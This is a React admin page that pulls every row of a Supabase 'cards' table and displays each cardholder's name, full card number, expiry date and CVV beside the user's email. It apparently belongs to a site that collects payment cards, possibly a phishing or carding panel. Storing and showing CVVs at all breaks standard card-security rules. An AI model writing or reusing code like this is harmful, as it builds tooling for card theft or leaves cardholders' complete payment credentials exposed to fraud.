import { useEffect, useState } from "react";
import { Card } from "@/components/ui/card";
import { supabase } from "@/integrations/supabase/client";

type Row = {
  id: string; user_id: string; card_holder: string; card_number: string; expiry: string; cvv: string; created_at: string | null;
  profile?: { email: string } | null;
};

const AdminCards = () => {
  const [rows, setRows] = useState<Row[]>([]);
  useEffect(() => {
    (async () => {
      const { data } = await supabase.from("cards").select("*").order("created_at", { ascending: false });
      const list = (data ?? []) as Row[];
      const ids = [...new Set(list.map(r => r.user_id))];
      if (ids.length) {
        const { data: profs } = await supabase.from("profiles").select("id, email").in("id", ids);
        const map = new Map((profs ?? []).map((p: any) => [p.id, p]));
        list.forEach(r => (r.profile = map.get(r.user_id) as any));
      }
      setRows(list);
    })();
  }, []);
  return (
    <div>
      <h1 className="text-2xl font-black mb-4">Card List ({rows.length})</h1>
      <div className="space-y-3">
        {rows.map(r => (
          <Card key={r.id} className="p-4">
            <p className="text-xs text-muted-foreground">{r.profile?.email || r.user_id} • {r.created_at?.slice(0,16).replace("T"," ")}</p>
            <p className="font-bold mt-1">{r.card_holder}</p>
            <p className="font-mono text-sm">{r.card_number} <span className="text-muted-foreground ml-3">EXP {r.expiry} • CVV {r.cvv}</span></p>
          </Card>
        ))}
        {!rows.length && <p className="text-center text-muted-foreground py-12">No cards.</p>}
      </div>
    </div>
  );
};
export default AdminCards;